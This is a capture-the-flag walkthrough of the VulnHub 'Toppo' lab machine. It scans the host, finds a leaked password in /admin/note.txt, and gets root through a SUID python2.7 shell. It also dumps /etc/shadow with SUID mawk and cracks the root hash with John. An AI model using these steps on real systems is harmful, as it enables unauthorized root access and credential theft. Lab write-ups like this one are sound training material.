# Toppo | VulnHub
https://www.vulnhub.com/entry/toppo-1,245/

### 1. Scan
```bash
Nmap scan report for 192.168.34.136
Host is up, received arp-response (0.00092s latency).
Scanned at 2021-07-17 00:02:55 EDT for 17s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMXeIQqeVVpxMNAkY4RTRcy1D29rxJsEteFBLHjNfezXeIK+LmbYWt1lJXfXjwXo1dwe6BjA388IYcnKnFu7FPshuDGA/H/MNj2o0JaVoiS4e0VONX5NTENh/a+lScGKcbpvi5sxRhL110w8lrdZYK6taXKUbYnDAl1BpCHdb+DfAAAAFQCMbk+1pL8kAIa/FTuxO9IuWf6/lwAAAIAmyFHznKAwdtfCNLaSzFWL/LNzBcTPytb7RMvhcIMKAkS/2IfnPIHdQmni7IFpq4CaLMjiVHTBvZQCSIYulIrXcpoGxLuZ3tPR0NS89AySdoOT/7ngs5AKx3nSVJqdomRzQ8Pjxs1VxadVE645hUir2lidBD2vZRDO5Pw3yT1BfgAAAIAW5d6lONexLVvMCH7t6AtmCDA6+R+5Eq6WtdA/XZ4e/cAKU2sSnrgd35imo4Jp8fYJEVBdIBqhrjjW0Pr7TZeWg/4hgsS5ZunhQG1mNmpgud28VveZfZaoxwudeylbfCHg4InYeE2aUrAlTOIw/pKMyWpqRniNuA5QMHPPIO+GVg==
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNiyFG4Uk84D3XUAN77szM4dkXvd6vOcyUKW3BARbCZFJQnGWqCBV6P0aR+Prs7Cx2+CVUeubbB2BFVQ6r4geCCNYV191XRdGPFFHlchAsfyhIJ1oLQYCAWxhWU6N2fYDcMwWVAlFHtgTXb5nmDFCz2dHHr9yUdzuOvXKHOgc4BFX8GP9dgmjkNPi8joLxowHuGiTcUlSsLU7sph9TrLV6j/TGqN3scrr1upMn6Vpv8/xA2zBYVU/jGVu/MyaaCEOL+WSXm58mKVBNnuPbBxatKRXUKebZDY7s+yLq0OPndwxxShfg7kHnaFF5Qbdan7a3UiR8RWHkpkbrVHuiwebx
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMGp55PVlF8Zt+uCcJjrAwbxX1WX6i/CcFYGh8lQHmwJWaQq8SqLkdfdyvlOOj7VSOw6NA82BiLSAfGI0s95Ig=
|   256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKG70nQU/kKxR0rcoe6hx38OEpmSQ08IHLqqkXQgSIfi
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          51198/tcp   status
|   100024  1          53110/tcp6  status
|   100024  1          55497/udp   status
|_  100024  1          58059/udp6  status
51198/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
MAC Address: 00:0C:29:60:49:7B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/17%OT=22%CT=1%CU=43461%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60F25680%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=2%ISR=10A%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)
```
The machine is running SSH, Apache on port 80 and RPCBind.

### 2. Look at the website
The main page is a bootstrap blog page, static HTML with all default posts. Nothing to really see. Did some dirbusting though and saw there was a /admin.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://192.168.34.136/ -x 403

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-17_00-11-16.log

Target: http://192.168.34.136/

Output File: /home/kali/Extra-Tools/dirsearch/reports/192.168.34.136/_21-07-17_00-11-16.txt

[00:11:16] Starting: 
[00:11:16] 301 -  313B  - /js  ->  http://192.168.34.136/js/
[00:11:21] 200 -    1KB - /LICENSE                                                                                                      
[00:11:21] 200 -    4KB - /README.md                                    
[00:11:22] 200 -    5KB - /about.html                                                                
[00:11:23] 301 -  316B  - /admin  ->  http://192.168.34.136/admin/  
[00:11:23] 200 -  937B  - /admin/                 
[00:11:23] 200 -  937B  - /admin/?/login
[00:11:29] 200 -    7KB - /contact.html                                                                           
[00:11:29] 301 -  314B  - /css  ->  http://192.168.34.136/css/
[00:11:31] 200 -    3KB - /gulpfile.js                                                                
[00:11:32] 301 -  314B  - /img  ->  http://192.168.34.136/img/     
[00:11:32] 200 -    6KB - /index.html                                                                          
[00:11:32] 200 -    2KB - /js/                                                                          
[00:11:33] 301 -  315B  - /mail  ->  http://192.168.34.136/mail/                                      
[00:11:33] 200 -  948B  - /mail/    
[00:11:34] 301 -  317B  - /manual  ->  http://192.168.34.136/manual/
[00:11:34] 200 -  626B  - /manual/index.html
[00:11:35] 200 -    1KB - /package.json                                                 
[00:11:35] 200 -  256KB - /package-lock.json
[00:11:36] 200 -    8KB - /post.html                                                           
[00:11:41] 200 -    1KB - /vendor/                                                                                
                                                                                                
Task Completed
```

Going to /admin in a browser, the index is listable and a note.txt file is accessible:
  
*Note to myself :
I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .*
  
### 3. Get a shell
The password has "ted" in it, so take a guess at the username.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh ted@192.168.34.136         
The authenticity of host '192.168.34.136 (192.168.34.136)' can't be established.
ECDSA key fingerprint is SHA256:+i9tqbQwK978CB+XRr02pS6QPd3evJ+lueOkK1LTtU0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.34.136' (ECDSA) to the list of known hosts.
ted@192.168.34.136's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
ted@Toppo:~$
```

### 4. Enumerate from user
Everything seems pretty airtight, until checking SUID binaries comes up.
```bash
ted@Toppo:/$ find . -perm /4000 2>/dev/null
./sbin/mount.nfs
./usr/sbin/exim4
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/gpasswd
./usr/bin/newgrp
./usr/bin/python2.7
./usr/bin/chsh
./usr/bin/at
./usr/bin/mawk
./usr/bin/chfn
./usr/bin/procmail
./usr/bin/passwd
./bin/su
./bin/umount
./bin/mount
```

The python 2.7 binary is has the suid bit set.

### 5. Escalate to root
RUn Python and then spawn a shell with the "os" module.
```bash
ted@Toppo:/$ /usr/bin/python2.7
Python 2.7.9 (default, Aug 13 2016, 16:41:35) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('/bin/sh')
# whoami
root
```

### Extra
Since /usr/bin/mawk also has the SUID bit set, this can be used to read the shadow file.
```bash
ted@Toppo:/$ /usr/bin/mawk '//' /etc/shadow
root:$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:17636:0:99999:7:::
daemon:*:17636:0:99999:7:::
bin:*:17636:0:99999:7:::
sys:*:17636:0:99999:7:::
sync:*:17636:0:99999:7:::
games:*:17636:0:99999:7:::
man:*:17636:0:99999:7:::
lp:*:17636:0:99999:7:::
mail:*:17636:0:99999:7:::
news:*:17636:0:99999:7:::
uucp:*:17636:0:99999:7:::
proxy:*:17636:0:99999:7:::
www-data:*:17636:0:99999:7:::
backup:*:17636:0:99999:7:::
list:*:17636:0:99999:7:::
irc:*:17636:0:99999:7:::
gnats:*:17636:0:99999:7:::
nobody:*:17636:0:99999:7:::
systemd-timesync:*:17636:0:99999:7:::
systemd-network:*:17636:0:99999:7:::
systemd-resolve:*:17636:0:99999:7:::
systemd-bus-proxy:*:17636:0:99999:7:::
Debian-exim:!:17636:0:99999:7:::
messagebus:*:17636:0:99999:7:::
statd:*:17636:0:99999:7:::
avahi-autoipd:*:17636:0:99999:7:::
sshd:*:17636:0:99999:7:::
ted:$6$U2/Cun.m$A2eC7LBIW6D0eM1BPJWz6rSAGcnmfR/OC4MkPmEIZbuANEaCuNK1KPedXRhkMZbxkek7NX0lfqFVWl.tyN.lL0:17636:0:99999:7:::
```

The root password can be cracked with John.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ john root.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test123          (root)
1g 0:00:00:09 DONE (2021-07-17 00:29) 0.1009g/s 1782p/s 1782c/s 1782C/s paramedic..ellie123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
The creds are `root:test123`.  
From there, log straight in as root.

```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh root@192.168.34.136        
root@192.168.34.136's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 15 12:28:00 2018 from 192.168.0.29
root@Toppo:~# id
uid=0(root) gid=0(root) groups=0(root)
```